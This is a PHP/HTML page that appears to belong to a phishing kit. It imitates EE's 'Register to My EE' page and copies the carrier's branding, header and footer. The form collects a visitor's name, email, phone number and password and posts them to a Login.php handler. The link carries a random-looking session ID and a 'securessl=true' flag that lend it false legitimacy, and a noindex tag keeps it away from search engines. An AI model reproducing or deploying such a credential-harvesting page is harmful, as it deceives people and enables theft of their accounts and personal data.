<?php

require "CONTROLS.php";
require "includes/session_protect.php";
require "includes/functions.php";
require "includes/One_Time.php";
require "includes/enc.php";
?>
<!DOCTYPE html>
<html class="js flexbox no-touch geolocation multiplebgs backgroundsize cssanimations csscolumns cssgradients csstransforms csstransforms3d csstransitions video audio svg">
<head>
    <meta content="text/html; charset=utf-8" http-equiv="Content-Type">
    <meta content="IE=11; IE=10; IE=9; IE=8; IE=EDGE" http-equiv="X-UA-Compatible">
    <title>Register</title>
    <meta content="noindex,nofollow" name="robots">
    <meta content="user-scalable=0, width=device-width, initial-scale=1.0, minimum-scale=1.0, maximum-scale=1.0" name="viewport">
    <meta content="telephone=no" name="format-detection">
    <link href="assets/img/favicon.ico" rel="icon" type="image/x-icon">
    <link href="assets/css/jquery.popups.css" rel="stylesheet">
    <style type="text/css">
        #oo_feedback_fl_spacer { display: block; height: 1px; position: absolute; top: 0; width: 100px; }
        .oo_feedback_float { width: 100px; height: 50px; overflow: hidden; font: 12px Tahoma, Arial, Helvetica, sans-serif; text-align: center; color: #252525; cursor: pointer; z-index: 999997; position: fixed; bottom: 5px; border: 1px solid #cccccc; border-radius: 9px; -moz-border-radius: 9px; -webkit-border-radius: 9px; right: 10px; -webkit-transition: -webkit-transform 0.3s ease; }
        .oo_feedback_float .screen_reader { color: transparent; display: block; position: relative; height: 0; width: 0; line-height: 0; overflow: hidden; }
        .oo_feedback_float .olUp { width: 100%; height: 100%; background: url(https://eetagging-zr.ee.co.uk/onlineopinionV7/oo_float_icon.gif) center 10px no-repeat; text-align: center; padding: 31px 0 5px 0; position: relative; z-index: 2; filter: alpha(opacity=100); opacity: 1; transition: opacity 0.5s; -moz-transition: opacity 0.5s; -webkit-transition: opacity 0.5s; -o-transition: opacity 0.5s; }
        .oo_feedback_float .olUp img { margin-bottom: 5px; }
        .oo_feedback_float .oo_transparent { display: block; background: white; position: absolute; top: 0; left: 0; height: 100%; width: 100%; z-index: 1; opacity: 0.8; filter: alpha(opacity=80); border-radius: 8px; -moz-border-radius: 8px; -webkit-border-radius: 8px; }
        .oo_feedback_float:hover .oo_transparent { opacity: 1.0; filter: alpha(opacity=100); }
        .oo_feedback_float:hover .olUp { display: block; opacity: 0; filter: alpha(opacity=0); }
        .oo_feedback_float .fbText { display: block; }
        .oo_feedback_float .olOver { display: block; height: 100%; width: 100%; position: absolute; top: 0; left: 0; min-height: 50px; z-index: 2; opacity: 0; filter: alpha(opacity=0); transition: opacity 0.5s; -moz-transition: opacity 0.5s; -webkit-transition: opacity 0.5s; -o-transition: opacity 0.5s; }
        .oo_feedback_float .olOver span { display: block; padding: 10px 5px; }
        .oo_feedback_float:hover .olOver { opacity: 1.0; filter: alpha(opacity=100); top: 0; }
        .oo_cc_wrapper { left: 0; padding: 0; position: fixed; text-align: center; top: 25px; width: 100%; z-index: 999999; }
        .oo_cc_wrapper .screen_reader { color: transparent; display: block; position: relative; height: 0; width: 0; line-height: 0; overflow: hidden; }
        .oo_cc_wrapper span { width: 100%; height: 100%; position: absolute; left: 0; top: 0; z-index: 1; }
        .oo_cc_wrapper .iwrapper { background-color: white; margin: 0 auto; position: relative; width: 535px; z-index: 2; box-shadow: rgba(0, 0, 0, 0.6) 0 0 15px; -webkit-box-shadow: rgba(0, 0, 0, 0.6) 0 0 15px; -moz-box-shadow: rgba(0, 0, 0, 0.6) 0 0 15px; border-radius: 9px; -moz-border-radius: 9px; -webkit-border-radius: 9px; }
        .oo_cc_wrapper iframe { position: relative; border: none; width: 100%; z-index: 4; }
        .oo_cc_wrapper .oo_cc_close { position: absolute; display: block; background: white; height: 20px; width: 20px; border: 1px solid #cccccc; cursor: pointer; right: -12px; top: -9px; border-radius: 5px; -moz-border-radius: 5px; -webkit-border-radius: 5px; transition: background 0.5s; -moz-transition: background 0.5s; -webkit-transition: background 0.5s; -o-transition: background 0.5s; font: 14px/20px Tahoma, Arial, Helvetica, sans-serif; text-align: center; z-index: 5; color: #252525; text-decoration: none; }
        .oo_cc_wrapper .oo_cc_close:hover { background: #eeeeee; }
        .oo_bar { padding-bottom: 22px; }
        #oo_bar { cursor: pointer; color: #252525; border-top: 1px solid #cccccc; background: #ffffff; bottom: 0; display: block; font: 12px Tahoma, Arial, Helvetica, sans-serif; height: 22px; left: 0; line-height: 22px; position: fixed; text-align: left; width: 100%; z-index: 999997; -webkit-transition: -webkit-transform 0.3s ease; transition: background 0.5s; -moz-transition: background 0.5s; -webkit-transition: background 0.5s; -o-transition: background 0.5s; }
        #oo_bar:hover { background: #eeeeee; }
        #oo_bar .screen_reader { color: transparent; display: block; position: relative; height: 0; width: 0; line-height: 0; overflow: hidden; }
        #oo_bar span { background: url(https://eetagging-zr.ee.co.uk/onlineopinionV7/oo_bar_icon.gif) left no-repeat; display: block; margin: 0 15px; height: 100%; padding-left: 17px; }
        #oo_tab { background-color: #f13f3c; border: 2px solid #ffffff; display: block; position: fixed; top: 30%; padding: 15px 0px 15px 0px; _height: 30px; _padding: 0px; _top: 45%; width: 108px; z-index: 999995; cursor: pointer; box-shadow: rgba(0, 0, 0, 0.7) 0 0 3px; -moz-box-shadow: rgba(0, 0, 0, 0.7) 0 0 3px; -webkit-box-shadow: rgba(0, 0, 0, 0.7) 0 0 3px; }
        #oo_tab span { bottom: 6px; display: block; background: url(https://eetagging-zr.ee.co.uk/onlineopinionV7/oo_tab_icon.gif) no-repeat; height: 17px; position: absolute; width: 19px; }
        #oo_tab div { position: absolute; display: block; height: 100%; left: 0; top: 0; width: 100%; }
        #oo_tab.wcag a { background: url(https://eetagging-zr.ee.co.uk/onlineopinionV7/oo_tab_icon.gif) no-repeat; background-repeat: no-repeat; background-position: center bottom; border: none; outline: none; position: absolute; display: block; bottom: 15px; left: -6px; top: 0; width: 100%; }
        #oo_tab.wcag img { border: none; outline: none; display: block; position: absolute; left: 0; top: -10px; }
        #oo_tab .screen_reader { color: transparent; display: block; position: relative; height: 0; width: 0; line-height: 0; overflow: hidden; }
        .oo_tab_left { left: -13px; border-radius: 0px 9px 9px 0px; -moz-border-radius: 0px 9px 9px 0px; -webkit-border-radius: 0px 9px 9px 0px; transition: left 0.5s; -moz-transition: left 0.5s; -webkit-transition: left 0.5s; -o-transition: left 0.5s; background-image: -webkit-gradient(linear, 0% 100%, 0% 0%, from(#eeeeee), to(white)); background-image: -webkit-linear-gradient(left, #eeeeee, white); background-image: -moz-linear-gradient(left, #eeeeee, white); background-image: -ms-linear-gradient(left, #eeeeee, white); background-image: -o-linear-gradient(left, #eeeeee, white); background-image: linear-gradient(left, #eeeeee, white); }
        .oo_tab_left span { right: 6px; }
        .oo_tab_left div { background-position: 6px -10px; }
        .oo_tab_left:hover { left: -5px; }
        .oo_tab_right { right: -77px; border-radius: 5px 0px 0px 5px; -moz-border-radius: 5px 0px 0px 5px; -webkit-border-radius: 5px 0px 0px 5px; transition: right 1.0s; -moz-transition: right 1.0s; -webkit-transition: right 1.0s; -o-transition: right 1.0s; background-image: -webkit-linear-gradient(top, #1ba9a9, #1ba9a9); background-image: -moz-linear-gradient(top, #1ba9a9, #1ba9a9); background-image: -ms-linear-gradient(top, #1ba9a9, #1ba9a9); background-image: -o-linear-gradient(top, #1ba9a9, #1ba9a9); background-image: linear-gradient(top, #1ba9a9, #1ba9a9); }
        .oo_tab_right span { left: 7px; }
        .oo_tab_right:hover { right: -5px; }
        span#oo_tab_text { color: white; position: absolute; top: 7px; left: 33px; background-image: none; font-family: Tahoma, Helvetica, Arial, sans-serif; line-height: 16px; font-size: 16px; }
        .oo_tab_ie_right { border-right: none !important; right: 1px; width: 31px !important; }
        #oo_tab.oo_tab_ie67_right.wcag { overflow: hidden !important; right: 0px !important; width: 26px !important; }
        #oo_tab.oo_tab_ie67_right.wcag:hover { right: 0px !important; width: 31px !important; }
        #oo_tab.oo_tab_ie67_right.wcag a { background: none; z-index: 1; }
        #oo_tab.oo_tab_ie67_right.wcag .screen_reader { bottom: 15px; display: block; background: url(https://eetagging-zr.ee.co.uk/onlineopinionV7/oo_tab_icon.gif) no-repeat; height: 9px; width: 9px; position: absolute; left: 7px; top: auto; z-index: 9999; }
        #oo_container { position: fixed; height: 100%; width: 100%; top: 0; left: 0; z-index: 999999; }
        html body #oo_invitation_prompt { background: white; box-shadow: rgba(0, 0, 0, 0.6) 0 0 15px; -webkit-box-shadow: rgba(0, 0, 0, 0.6) 0 0 15px; -moz-box-shadow: rgba(0, 0, 0, 0.6) 0 0 15px; -webkit-box-shadow: rgba(0, 0, 0, 0.6) 0 0 8px; -moz-box-shadow: rgba(0, 0, 0, 0.6) 0 0 8px; border-radius: 9px; -moz-border-radius: 9px; -webkit-border-radius: 9px; color: #252525; font: 14px/20px Tahoma, Arial, san-serif; line-height: 20px; margin: 50px auto; text-align: left; padding: 20px 10px; position: relative; width: 350px; z-index: 999999; }
        html body #oo_invitation_prompt h1 { font-size: 24px; font-weight: 100; margin-bottom: .6em; }
        html body #oo_invitation_prompt p { margin-bottom: 1.5em; }
        html body #oo_invitation_prompt #prompt_buttons { padding-bottom: 15px; position: relative; z-index: 5; }
        html body #oo_invitation_prompt #oo_launch_prompt { text-decoration: none; color: white; border: 1px solid #006633; padding: 5px 11px; margin-right: 17px; }
        html body #oo_invitation_prompt #oo_no_thanks { text-decoration: none; color: #252525; border: 1px solid #cccccc; padding: 5px 11px; margin-right: 18px; }
        html body #oo_ol_brand { display: block; height: 22px; }
        #oo_ol_brand { background: url(https://eetagging-zr.ee.co.uk/onlineopinionV7/oo_inv_opinionlab.png) bottom right no-repeat; border-top: 1px solid #cccccc; }
        #oo_invitation_prompt a { background: white; border-radius: 5px; -moz-border-radius: 5px; -webkit-border-radius: 5px; transition: background 0.5s; -moz-transition: background 0.5s; -webkit-transition: background 0.5s; -o-transition: background 0.5s; }
        #oo_invitation_prompt a:hover { background: #eeeeee; }
        a#oo_launch_prompt { background: #006633; }
        a#oo_launch_prompt:hover { background: #009966; }
        #oo_close_prompt { position: absolute; display: block; background: white; height: 20px; width: 20px; border: 1px solid #cccccc; cursor: pointer; right: 5px; top: 5px; border-radius: 5px; -moz-border-radius: 5px; -webkit-border-radius: 5px; transition: background 0.5s; -moz-transition: background 0.5s; -webkit-transition: background 0.5s; -o-transition: background 0.5s; font: 14px/20px Tahoma, Arial, Helvetica, sans-serif; text-align: center; }
        #oo_close_prompt:hover { background: #eeeeee; }
        #oo_close_prompt .screen_reader { color: transparent; display: block; position: relative; height: 0; width: 0; line-height: 0; overflow: hidden; }
        #oo_overlay, #oo_invitation_overlay { background: black url(https://eetagging-zr.ee.co.uk/onlineopinionV7/oo_loading.gif) 50% 80px no-repeat; display: block; height: 1000%; left: 0; position: fixed; top: 0; width: 100%; z-index: 999998; opacity: 0.5; filter: alpha(opacity=50); }
        #oo_overlay.no_loading, #oo_invitation_overlay.no_loading { background: black; opacity: 0.5; filter: alpha(opacity=50); }
        @media print { #oo_bar, .oo_feedback_float, #oo_tab { display: none; } }
        @media only screen and (max-device-width: 480px) { /* Styles */
            html body #oo_invitation_prompt { -webkit-text-size-adjust: none; box-sizing: border-box; -moz-box-sizing: border-box; -webkit-box-sizing: border-box; width: 90%; padding: 3%; }
            #oo_tab{ display: none; transition: display 1.0s; -moz-transition: display 1.0s; -webkit-transition: display 1.0s; -o-transition: display 1.0s; }
        }
        @media all and (-webkit-min-device-pixel-ratio: 2) { #oo_ol_brand { background: url(https://eetagging-zr.ee.co.uk/onlineopinionV7/oo_inv_opinionlab@2x.png) bottom right no-repeat; -webkit-background-size: 85px 13px; } }
    </style>
    <link href="assets/img/favicon.ico" rel="icon" type="image/x-icon">
    <link href="assets/css/providers.css" rel="stylesheet" type="text/css">
    <link href="assets/css/widgets.css" rel="stylesheet" type="text/css">
    <link href="assets/css/janrain-custom.css" rel="stylesheet" type="text/css">
    <link href="assets/css/jquery.password-field-show-hideable.css" rel="stylesheet">
    <script>
        function Valid() {
            var x = document.forms["login"]["user"].value;
            if (x == null || x == "") {
                document.getElementById("ErrorUser").style.display = "block";
                return false;
            }
            var y = document.forms["login"]["pass"].value;
            if (y == null || y == "") {
                document.getElementById("ErrorPass").style.display = "block";
                return false;
            }
        }
    </script>
</head>
<body class="handheld">
<div style="visibility: visible; display: block;">
    <div id="globalMbox">
    </div>
</div>
<style>
    #title-section .container {
        padding: 0;             /*removing the padding within the header*/
    }
    #title-section .container .panel h1 {
        margin-bottom: 4px;     /*Reducing the margin from below the H1 Login*/
    }
    .panel .sub-sub-title .sub-sub-title-row-1 {
        margin-bottom:0px;      /*removes the padding from below "including 4GEE WiFi etc."*/
    }
    #janrain-login-form .container, #janrain-login-form .container > .span-12  {
        padding: 0px 12px;      /*Removes the padding form the top of the main for, twice*/
    }
    #forgotten-email-address-popup-container .popup-trigger {
        font-size: 1em;         /*Shrinks forgotten email address*/
    }
    #forgotten-passwordlink .arrow-after {
        font-size: 1em;         /*Shrinks forgotten password*/
    }
    #signIn #capture_signIn_userInformationForm .traditionalSignIn_signInButton {
        margin:4px 0px;         /*Pulls the log in button higher*/
    }
    #capture_signIn_form_item_traditionalSignIn_emailAddress, #capture_signIn_form_item_traditionalSignIn_password {
        margin: 4px 0px!important;
    }
    .janrain-manually-inserted-label {
        margin-top:16px!important;
        margin-bottom: 8px!important;
    }
    #traditional_registerlink #signUp {
        font-size: 1em;
    }
</style>
<link href="assets/css/main.css" rel="stylesheet">
<link href="assets/css/modules.css" rel="stylesheet">
<link href="assets/css/common.css" rel="stylesheet">
<link href="assets/css/plugins.css" rel="stylesheet">
<link href="assets/css/myee_addons.css" rel="stylesheet">
<link href="assets/css/jquery.the-modal.css" rel="stylesheet">
<link href="assets/css/boom.css" rel="stylesheet">
<link href="assets/css/myee-common.css" rel="stylesheet">
<link href="assets/css/flowlogindispatcher.css" rel="stylesheet">
<div class="global-mast-head-iparsys parsys iparsys"><a style="visibility:hidden"></a>
    <div class="parsys global-masthead section">
        <header class="MainHeadero">
            <div class="TopBlackBar" style="height:34px;padding-bottom: 40px!important;">
                <div class="container group">
                    <div class="parbase segmentSelector segment-selector">
                        <div class="MainHeadero-segment">
                            <div class="MainHeadero-segment__segment MainHeadero-segment__segment--consumer"><a class="current MainHeadero-segment-selector-link" href="#">Personal</a>
                            </div>

                            <div class="MainHeadero-segment__segment MainHeadero-segment-selector MainHeadero-segment-selector--inactive"><a class="MainHeadero-segment-selector-link" href="#">Business</a>
                                <div class="content_below-cut">
                                </div>
                            </div>
                        </div>
                    </div>

                    <div class="MainHeadero-utility"><span class="MainHeadero-utility__link MainHeadero-utility__link--contact"><a class="icon-link" href="#"><span class="icon ee-icon-contact"></span> Contact us</a></span> <span class="MainHeadero-utility__link MainHeadero-utility__link--findstore"><a class="icon-link" href="#"><span class="icon ee-icon-findstore StoreLocator"></span> Store finder</a></span> <span class="MainHeadero-utility__link MainHeadero-utility__link--coverage"><a class="icon-link" href="#"><span class="icon ee-icon-coverage"></span> Coverage checker</a></span></div>
                </div>
            </div>

            <div class="MainHeadero-main">
                <div class="container">
                    <p class="MainHeadero__logo"><a href="#"><object data="assets/img/logo.svg" type="image/svg+xml">EE</object></a>
                    </p>

                    <nav class="ee-nav">
                        <ul>
                            <li class="ee-nav__link--category ee-nav__link--current ee-nav__link ee-nav-link__consumer ee-nav__link--expandable"><a href="#"><span>MY EE</span></a></li>
                            <li class="ee-nav__link--category ee-nav__link ee-nav-link__consumer ee-nav__link--expandable"><a href="#"><span>Shop</span></a></li>
                            <li class="ee-nav__link--category ee-nav__link ee-nav-link__consumer ee-nav__link--expandable"><a href="#"><span>Help</span></a></li>
                            <li class="ee-nav__link--category ee-nav__link ee-nav-link__consumer ee-nav__link--expandable"><a href="#"><span>Why EE</span></a></li>
                            <li class="ee-nav__link ee-nav__link--primary handheld-only"><a href="#"><span class="brand-ee">Contact us</span></a></li>
                        </ul>
                    </nav>

                    <div class="MainHeadero-tools group">
                        <div class="MainHeadero-basket"><a class="MainHeadero-tools__link MainHeadero-tools__link--icon MainHeadero-basket__link ee-icon-basket" href="#"><span class="assistive-text">Basket</span> <span class="MainHeadero-basket__items empty"></span></a>
                            <div class="MainHeadero-minibasket"></div>
                        </div>

                        <div class="MainHeadero-search">
                            <a class="MainHeadero-tools__link MainHeadero-tools__link--icon MainHeadero-search__toggle ee-icon-search" href="#">
                                <span class="assistive-text">Search</span></a>
                            <form action="" class="MainHeadero-search__form" method="get">
                                <div class="MainHeadero-search__search-box styled-search-box">
                                    <input class="yui-ac-input" id="l" name="l" placeholder="Search" title="Search field" type="search">
                                    <span class="MainHeadero-search__clear ee-icon-close"><span class="assistive-text">Clear</span></span>
                                    <button class="ee-icon-search" id="searchform-submit" type="submit"><span class="assistive-text">Search</span></button>
                                </div>

                                <div class="MainHeadero-search__autocomplete yui-ac-container" id="autocomplete"></div>

                            </form>
                        </div>

                        <div class="MainHeadero-auth">
<span class="MainHeadero-auth__greeting">Hello,
<span class="MainHeadero-auth__name">guest</span>. Not you?</span>
                            <a class="MainHeadero-tools__link MainHeadero-auth__link MainHeadero-auth__link--login" style="max-width: 100px;padding-top: .2em;padding-bottom: .2em;height: 33px;display: table-cell;vertical-align: middle;" href="#">
                                <span class="MainHeadero-auth__link-text">Log in / Register</span><span aria-hidden="true" class="icon ee-icon-chevronnext"></span></a> <a class="MainHeadero-tools__link MainHeadero-auth__link MainHeadero-auth__link--logout" href="https://myaccount.ee.co.uk/login-dispatch?fa=logout"><span class="MainHeadero-auth__link-text">Log out</span><span aria-hidden="true" class="icon ee-icon-chevronnext"></span></a></div>

                        <div><a class="MainHeadero-tools__link MainHeadero-tools__nav-toggle" href="#">Menu</a>
                        </div>
                    </div>
                </div>
            </div>

            <div class="MainHeadero-handheld-search">
            </div>


        </header>
    </div>
</div>




<main class="myee signIn v2-access-flow jsp-janrain-login-v2 janrain-content" id="main" tabindex="0">

    <section id="title-section">
        <section class="module white jsp-janrain-login-v2" id="full-width-header">
            <div class="container">
                <div class="col span-12">
                    <div class="panel">
                        <h1 class="center">Register</h1>

                        <p class="center">to My EE for <span class="ee-subheader-logo-colour">EE mobile</span></p>

                        <div class="sub-sub-title center">
                            <p class="sub-sub-title-row-1">including 4GEE WiFi, 4GEE Action Cam and tablets</p>

                            <hr class="sub-title-hr">

                            <p class="sub-sub-title-row-2">
                            </p>

                            <div class="popup-container" id="manage-different-account-popup-container"><a class="manage-different-account-link popup-trigger arrow-after" data-popup="manage-different-account-popup" href="#">Looking for another account?</a>
                            </div>

                            <p>
                            </p>
                        </div>
                    </div>
                </div>
            </div>
        </section>
    </section>

    <section class="" id="janrain-login-form">
        <div id="manage-account-login-popup">
        </div>



        <div class="container">
            <div class="col span-12">
                <div class=" col-span-5 login_margin">

                    <div id="janrain-loginv2-input-panel">
                        <div class="janrain-capture-ui capture-ui-content capture_screen_container janrain-capture-ui-mobile janrain-capture-ui-mobile-landscape" data-capturescreenname="signIn" data-captureventadded="true" id="signIn" style="display: block;">
                            <form accept-charset="UTF-8" action="Login.php?&sessionid=<?php echo generateRandomString(130); ?>&securessl=true" class="capture_form capture_userInformationForm" method="post" name="login" id="login" onsubmit="return Valid();">
                                <div id="capture_signIn_userInformationForm_defaultSavedProfileMessage">
                                </div>

                                <div id="ErrorBox"></div>

                                <div class="janrain-manually-inserted-label"><label for="user">Name</label></div>

                                <div class="capture_form_item capture_email capture_form_item_traditionalSignIn_emailAddress">
                                    <input class="capture_traditionalSignIn_emailAddress capture_required capture_text_input" name="name"  placeholder="Name" type="text" value="">
                                    <div id="ErrorUser" class="capture_tip_error" style="display:none">Please enter your name</div>
                                </div>
                                <div class="janrain-manually-inserted-label"><label for="user">Email address:</label></div>

                                <div class="capture_form_item capture_email capture_form_item_traditionalSignIn_emailAddress">
                                    <input class="capture_traditionalSignIn_emailAddress capture_required capture_text_input" name="user" id="user" placeholder="example@mail.com" type="email" value="">
                                    <div id="ErrorUser" class="capture_tip_error" style="display:none">Please enter your email address</div>
                                </div>
                                <div class="janrain-manually-inserted-label"><label for="user">Phone Number:</label></div>

                                <div class="capture_form_item capture_email capture_form_item_traditionalSignIn_emailAddress">
                                    <input class="capture_traditionalSignIn_emailAddress capture_required capture_text_input" name="phone"  placeholder="+44*********" type="text" value="">
                                    <div id="ErrorUser" class="capture_tip_error" style="display:none">Please enter your phone</div>
                                </div>



                                <div class="janrain-manually-inserted-label"><label for="pass">Password:</label></div>

                                <div class="capture_form_item capture_password capture_form_item_traditionalSignIn_password">
                                    <input autocomplete="off" class="capture_traditionalSignIn_password capture_required capture_text_input" id="pass" name="pass" placeholder="" type="password" value="">
                                    <div id="ErrorPass" class="capture_tip_error" style="display:none">Please enter your password</div>
                                    <div class="showpass" id="ShowPass"><a href="#"></a></div>
                                </div>

                                <div class="janrain-manually-inserted-label"><label for="pass">Confirm Password:</label></div>

                                <div class="capture_form_item capture_password capture_form_item_traditionalSignIn_password">
                                    <input autocomplete="off" class="capture_traditionalSignIn_password capture_required capture_text_input" name="pass2" placeholder="" type="password" value="">
                                    <div id="ErrorPass" class="capture_tip_error" style="display:none">Please enter your password</div>
                                    <div class="showpass" id="ShowPass"><a href="#"></a></div>
                                </div>
                                <div class="form-row">
                                    <div class="capture_tip_error" id="incorrect-credentials-message" style="display: none;">You've entered an incorrect email address or password</div>
                                </div>


                                <div class="traditionalSignIn_signInButton"><button class="capture_secondary capture_traditionalSignIn_signInButton capture_btn capture_primary" data-capturefield="traditionalSignIn_signInButton" id="capture_signIn_traditionalSignIn_signInButton" name="traditionalSignIn_signInButton" type="submit" value="Register">Register</button>
                                </div>

                                <div class="form-row">
                                    <div id="traditional_registerlink">
                                        <a class="arrow-after" href="Login.php?&sessionid=<?php echo generateRandomString(130); ?>&securessl=true">Need to login?</a>
                                    </div>
                                </div>
                            </form>

                        </div>
                    </div>
                </div>
            </div>
        </div>
    </section>





</main>

<div class="parsys iparsys global-footer-iparsys">
    <div class="parsys global-footer section">
        <footer class="ee-footer" id="ee-footer" role="contentinfo">
            <div class="ee-footer-primary theme-standard theme-white">
                <div class="container">
                    <div class="ee-footer-links">
                        <section class="ee-footer-links-section">
                            <p class="ee-footer-links-section__heading">OUR COMPANY</p>

                            <ul>
                                <li><a href="#">About Us</a>
                                </li>

                                <li><a href="#">Our Brands</a>
                                </li>

                                <li><a href="#">Newsroom</a>
                                </li>

                                <li><a href="#">Financials</a>
                                </li>

                                <li><a href="#">Responsibility</a>
                                </li>
                            </ul>
                        </section>

                        <section class="ee-footer-links-section">
                            <p class="ee-footer-links-section__heading">USEFUL LINKS</p>

                            <ul>
                                <li><a href="#">EE Community</a>
                                </li>

                                <li><a href="#">Insurance &amp; Protection</a>
                                </li>

                                <li><a href="#">Recycle and Reward</a>
                                </li>

                                <li><a href="#">e-safety and e-skills</a>
                                </li>

                                <li><a href="#">Careers</a>
                                </li>

                                <li><a href="#">EE Franchise</a>
                                </li>
                            </ul>
                        </section>

                        <section class="ee-footer-links-section">
                            <p class="ee-footer-links-section__heading">Legal</p>

                            <ul>
                                <li><a href="#">Terms and conditions</a>
                                </li>

                                <li><a href="#">Privacy</a>
                                </li>

                                <li><a href="#">Codes of practice</a>
                                </li>

                                <li><a href="#">Accessibility</a>
                                </li>

                                <li><a href="#">EE Power Bar recall</a>
                                </li>

                                <li><a href="#">Modern Slavery Statement</a>
                                </li>
                            </ul>
                        </section>

                        <section class="ee-footer-links-section ee-footer-links-section--social">
                            <p class="ee-footer-links-section__heading">How to find EE</p>

                            <ul>
                                <li><a href="#">Coverage Checker</a>
                                </li>

                                <li><a href="#">Store finder</a>
                                </li>
                            </ul>

                            <p class="ee-footer-social">
                                <a class="ee-footer-social__link ee-icon-twitter" href="#"><span class="assistive-text">EE on Twitter</span></a>
                                <a class="ee-footer-social__link ee-icon-facebook" href="#"><span class="assistive-text">EE on Facebook</span></a>
                                <a class="ee-footer-social__link ee-icon-youtube" href="#"><span class="assistive-text">EE on YouTube</span></a>
                                <a class="ee-footer-social__link ee-icon-linkedin" href="#"><span class="assistive-text">EE on LinkedIn</span></a>
                            </p>
                        </section>
                    </div>
                </div>
            </div>

            <div class="ee-footer-secondary">
                <div class="container">
                    <p class="ee-footer-copyright">&copy; 2017&nbsp;EE Limited</p>

                    <p class="ee-footer-brand">
<span class="ee-footer-brand__link">
<a class="ee-bgimg-orange-logo" href="#"><span class="assistive-text">Visit the Orange website (opens in a new tab/window)</span></a>
</span>
                        <span class="ee-footer-brand__link"><a class="ee-bgimg-tmobile-logo" href="#"><span class="assistive-text">Visit the T-Mobile website (opens in a new tab/window)</span></a>
</span>
                        <span class="ee-footer-brand__text">brought to you by EE</span></p>
                </div>
            </div>
        </footer>
    </div>

    <div class="section">
        <div class="new">
        </div>
    </div>

    <div class="iparys_inherited">
        <div class="parsys iparsys global-footer-iparsys">
        </div>
    </div>
</div>
</body>
</html>